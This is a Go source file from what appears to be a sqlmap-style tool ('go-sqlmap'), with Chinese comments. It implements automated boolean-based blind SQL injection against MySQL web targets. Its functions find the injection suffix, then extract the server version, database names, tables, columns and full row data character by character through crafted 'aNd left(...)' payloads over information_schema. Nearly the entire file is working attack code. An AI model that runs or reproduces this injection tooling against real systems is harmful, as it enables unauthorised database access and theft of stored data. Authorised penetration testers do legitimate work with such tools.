package core

import (
	"fmt"
	"github.com/EmYiQing/go-sqlmap/constant"
	"github.com/EmYiQing/go-sqlmap/log"
	"github.com/EmYiQing/go-sqlmap/util"
	"strconv"
	"strings"
)

// GetBoolBlindSuffix 检测盲注的闭合符
func GetBoolBlindSuffix(target string, suffixList []string) (bool, string) {
	for _, v := range suffixList {
		_, _, trueBody := util.Request(constant.DefaultMethod,
			target+v+constant.BlindDetectTruePayload, nil, nil)
		_, _, falseBody := util.Request(constant.DefaultMethod,
			target+v+constant.BlindDetectFalsePayload, nil, nil)
		if string(trueBody) != string(falseBody) {
			return true, v
		}
	}
	return false, ""
}

// GetVersionByBoolBlind 盲注获得版本
func GetVersionByBoolBlind(target string, suffix string) (bool, string) {
	_, _, defaultBody := util.Request(constant.DefaultMethod,
		target+suffix+constant.BlindDetectFalsePayload, nil, nil)
	var length int
	for i := 1; ; i++ {
		if i > 1000 {
			break
		}
		payload := target + suffix + constant.Space + "aNd" + constant.Space +
			"length(version())=" + strconv.Itoa(i) + constant.Space + constant.Annotator
		code, _, tempBody := util.Request(constant.DefaultMethod,
			payload, nil, nil)
		if code != -1 {
			if string(tempBody) != string(defaultBody) {
				length = i
				break
			}
		}
	}
	log.InfoLine("mysql version:")
	var data string
	for i := 1; i < length+1; i++ {
		for a := 32; a < 127; a++ {
			tempStr := string(rune(a))
			payload := target + suffix + constant.Space + "aNd" + constant.Space +
				"left(version()," + strconv.Itoa(i) + ")='" + data + tempStr + "'" +
				constant.Space + constant.Annotator
			code, _, tempBody := util.Request(constant.DefaultMethod,
				payload, nil, nil)
			if code != -1 {
				if string(tempBody) != string(defaultBody) {
					fmt.Print(tempStr)
					data += tempStr
					break
				}
			}
		}
	}
	fmt.Print("\n")
	if len(data) > 0 {
		return true, data
	}
	return false, data
}

// GetCurrentDatabaseByBoolBlind 盲注获得当前数据库
func GetCurrentDatabaseByBoolBlind(target string, suffix string) (bool, string) {
	_, _, defaultBody := util.Request(constant.DefaultMethod,
		target+suffix+constant.BlindDetectFalsePayload, nil, nil)
	var length int
	for i := 1; ; i++ {
		if i > 1000 {
			break
		}
		payload := target + suffix + constant.Space + "aNd" + constant.Space +
			"length(database())=" + strconv.Itoa(i) + constant.Space + constant.Annotator
		code, _, tempBody := util.Request(constant.DefaultMethod,
			payload, nil, nil)
		if code != -1 {
			if string(tempBody) != string(defaultBody) {
				length = i
				break
			}
		}
	}
	log.InfoLine("current database:")
	var data string
	for i := 1; i < length+1; i++ {
		for a := 32; a < 127; a++ {
			tempStr := string(rune(a))
			payload := target + suffix + constant.Space + "aNd" + constant.Space +
				"left(database()," + strconv.Itoa(i) + ")='" + data + tempStr + "'" +
				constant.Space + constant.Annotator
			code, _, tempBody := util.Request(constant.DefaultMethod,
				payload, nil, nil)
			if code != -1 {
				if string(tempBody) != string(defaultBody) {
					fmt.Print(tempStr)
					data += tempStr
					break
				}
			}
		}
	}
	fmt.Print("\n")
	if len(data) > 0 {
		return true, data
	}
	return false, data
}

// GetAllDatabasesByBoolBlind 盲注获得所有数据库
func GetAllDatabasesByBoolBlind(target string, suffix string) {
	_, _, defaultBody := util.Request(constant.DefaultMethod,
		target+suffix+constant.BlindDetectFalsePayload, nil, nil)
	var count int
	for i := 1; ; i++ {
		if i > 1000 {
			break
		}
		payload := target + suffix + constant.Space + "aNd" + constant.Space +
			"(select%20count(schema_name)%20from%20information_schema.schemata)=" +
			strconv.Itoa(i) + constant.Space + constant.Annotator
		code, _, tempBody := util.Request(constant.DefaultMethod,
			payload, nil, nil)
		if code != -1 {
			if string(tempBody) != string(defaultBody) {
				count = i
				break
			}
		}
	}
	var data string
	var tempData string
	for c := 0; c < count; c++ {
		for i := 1; ; i++ {
			if i > 1000 {
				break
			}
			payload := target + suffix + constant.Space + "aNd" + constant.Space +
				"(select%20length(schema_name)%20from%20information_schema.schemata%20limit%20" + strconv.Itoa(c) + ",1)=" +
				strconv.Itoa(i) + constant.Space + constant.Annotator
			code, _, tempBody := util.Request(constant.DefaultMethod,
				payload, nil, nil)
			if code != -1 {
				if string(tempBody) != string(defaultBody) {
					for j := 1; j < i+1; j++ {
						for a := 32; a < 127; a++ {
							tempStr := string(rune(a))
							innerPayload := target + suffix + constant.Space + "aNd" + constant.Space +
								"left((select%20schema_name%20from%20information_schema.schemata%20limit%20" +
								strconv.Itoa(c) + ",1)," + strconv.Itoa(j) + ")='" + tempData + tempStr + "'" +
								constant.Space + constant.Annotator
							innerCode, _, innerTempBody := util.Request(constant.DefaultMethod,
								innerPayload, nil, nil)
							if innerCode != -1 {
								if string(innerTempBody) != string(defaultBody) {
									tempData += tempStr
									break
								}
							}
						}
					}
					log.Info("wait...")
					data = data + tempData + ","
					tempData = ""
				}

			}
		}
	}
	util.PrintDatabases(
		util.ConvertString(
			util.DeleteLastChar(data)))
}

// GetAllTablesByBoolBlind 盲注获得表
func GetAllTablesByBoolBlind(target string, suffix string, database string) {
	_, _, defaultBody := util.Request(constant.DefaultMethod,
		target+suffix+constant.BlindDetectFalsePayload, nil, nil)
	var count int
	for i := 1; ; i++ {
		if i > 1000 {
			break
		}
		payload := target + suffix + constant.Space + "aNd" + constant.Space +
			"(select%20count(table_name)%20from%20information_schema.tables%20" +
			"where%20table_schema='" + database + "')=" +
			strconv.Itoa(i) + constant.Space + constant.Annotator
		code, _, tempBody := util.Request(constant.DefaultMethod,
			payload, nil, nil)
		if code != -1 {
			if string(tempBody) != string(defaultBody) {
				count = i
				break
			}
		}
	}
	var data string
	var tempData string
	for c := 0; c < count; c++ {
		for i := 1; ; i++ {
			if i > 1000 {
				break
			}
			payload := target + suffix + constant.Space + "aNd" + constant.Space +
				"(select%20length(table_name)%20from%20information_schema.tables%20where%20table_schema='" +
				database + "'%20limit%20" + strconv.Itoa(c) + ",1)=" +
				strconv.Itoa(i) + constant.Space + constant.Annotator
			code, _, tempBody := util.Request(constant.DefaultMethod,
				payload, nil, nil)
			if code != -1 {
				if string(tempBody) != string(defaultBody) {
					for j := 1; j < i+1; j++ {
						for a := 32; a < 127; a++ {
							tempStr := string(rune(a))
							innerPayload := target + suffix + constant.Space + "aNd" + constant.Space +
								"left((select%20table_name%20from%20information_schema.tables%20" +
								"where%20table_schema='" + database + "'%20limit%20" +
								strconv.Itoa(c) + ",1)," + strconv.Itoa(j) + ")='" + tempData + tempStr + "'" +
								constant.Space + constant.Annotator
							innerCode, _, innerTempBody := util.Request(constant.DefaultMethod,
								innerPayload, nil, nil)
							if innerCode != -1 {
								if string(innerTempBody) != string(defaultBody) {
									tempData += tempStr
									break
								}
							}
						}
					}
					log.Info("wait...")
					data = data + tempData + ","
					tempData = ""
				}

			}
		}
	}
	util.PrintTables(
		util.ConvertString(
			util.DeleteLastChar(data)))
}

// GetAllColumnsByBoolBlind 盲注获得字段
func GetAllColumnsByBoolBlind(target string, suffix string, database string, table string) {
	_, _, defaultBody := util.Request(constant.DefaultMethod,
		target+suffix+constant.BlindDetectFalsePayload, nil, nil)
	var count int
	for i := 1; ; i++ {
		if i > 1000 {
			break
		}
		payload := target + suffix + constant.Space + "aNd" + constant.Space +
			"(select%20count(column_name)%20from%20information_schema.columns%20" +
			"where%20table_name='" + table + "'%20and%20table_schema='" + database + "')=" +
			strconv.Itoa(i) + constant.Space + constant.Annotator
		code, _, tempBody := util.Request(constant.DefaultMethod,
			payload, nil, nil)
		if code != -1 {
			if string(tempBody) != string(defaultBody) {
				count = i
				break
			}
		}
	}
	var data string
	var tempData string
	for c := 0; c < count; c++ {
		for i := 1; ; i++ {
			if i > 1000 {
				break
			}
			payload := target + suffix + constant.Space + "aNd" + constant.Space +
				"(select%20length(column_name)%20from%20information_schema.columns%20where%20table_schema='" +
				database + "'%20and%20table_name='" + table + "'%20limit%20" + strconv.Itoa(c) + ",1)=" +
				strconv.Itoa(i) + constant.Space + constant.Annotator
			code, _, tempBody := util.Request(constant.DefaultMethod,
				payload, nil, nil)
			if code != -1 {
				if string(tempBody) != string(defaultBody) {
					for j := 1; j < i+1; j++ {
						for a := 32; a < 127; a++ {
							tempStr := string(rune(a))
							innerPayload := target + suffix + constant.Space + "aNd" + constant.Space +
								"left((select%20column_name%20from%20information_schema.columns%20" +
								"where%20table_schema='" + database + "'%20and%20table_name='" + table + "'%20limit%20" +
								strconv.Itoa(c) + ",1)," + strconv.Itoa(j) + ")='" + tempData + tempStr + "'" +
								constant.Space + constant.Annotator
							innerCode, _, innerTempBody := util.Request(constant.DefaultMethod,
								innerPayload, nil, nil)
							if innerCode != -1 {
								if string(innerTempBody) != string(defaultBody) {
									tempData += tempStr
									break
								}
							}
						}
					}
					log.Info("wait...")
					data = data + tempData + ","
					tempData = ""
				}

			}
		}
	}
	util.PrintColumns(
		util.ConvertString(
			util.DeleteLastChar(data)))
}

// GetAllDataByBoolBlind 盲注获得数据
func GetAllDataByBoolBlind(target string, suffix string, database string, table string, columns []string) {
	_, _, defaultBody := util.Request(constant.DefaultMethod,
		target+suffix+constant.BlindDetectFalsePayload, nil, nil)

	tempPayload := "concat("
	for _, v := range columns {
		tempPayload = tempPayload + v + ",0x3a,"
	}
	r := []rune(tempPayload)
	result := string(r[:len(r)-6])
	tempPayload = result + ")"

	var count int
	for i := 1; ; i++ {
		if i > 1000 {
			break
		}
		payload := target + suffix + constant.Space + "aNd" + constant.Space +
			"(select%20count(" + tempPayload + ")%20from%20" + database + "." + table + ")=" +
			strconv.Itoa(i) + constant.Space + constant.Annotator
		code, _, tempBody := util.Request(constant.DefaultMethod,
			payload, nil, nil)
		if code != -1 {
			if string(tempBody) != string(defaultBody) {
				count = i
				break
			}
		}
	}
	var data []string
	var tempData string
	for c := 0; c < count; c++ {
		for i := 1; ; i++ {
			if i > 1000 {
				break
			}
			payload := target + suffix + constant.Space + "aNd" + constant.Space +
				"(select%20length(" + tempPayload + ")%20from%20" + database + "." +
				table + "%20limit%20" + strconv.Itoa(c) + ",1)=" +
				strconv.Itoa(i) + constant.Space + constant.Annotator
			code, _, tempBody := util.Request(constant.DefaultMethod,
				payload, nil, nil)
			if code != -1 {
				if string(tempBody) != string(defaultBody) {
					for j := 1; j < i+1; j++ {
						for a := 32; a < 127; a++ {
							tempStr := string(rune(a))
							innerPayload := target + suffix + constant.Space + "aNd" + constant.Space +
								"left((select%20" + tempPayload + "%20from%20" + database + "." + table + "%20limit%20" +
								strconv.Itoa(c) + ",1)," + strconv.Itoa(j) + ")='" + tempData + tempStr + "'" +
								constant.Space + constant.Annotator
							innerCode, _, innerTempBody := util.Request(constant.DefaultMethod,
								innerPayload, nil, nil)
							if innerCode != -1 {
								if string(innerTempBody) != string(defaultBody) {
									tempData += tempStr
									break
								}
							}
						}
					}
					log.Info("wait...")
					data = append(data, tempData)
					tempData = ""
				}

			}
		}
	}
	log.Info("get data success")
	var output [][]string
	for _, v := range data {
		var temp []string
		params := strings.Split(v, ":")
		for _, innerV := range params {
			temp = append(temp, innerV)
		}
		output = append(output, temp)
	}
	util.PrintData(util.ConvertInterfaceArray(columns, output))
}
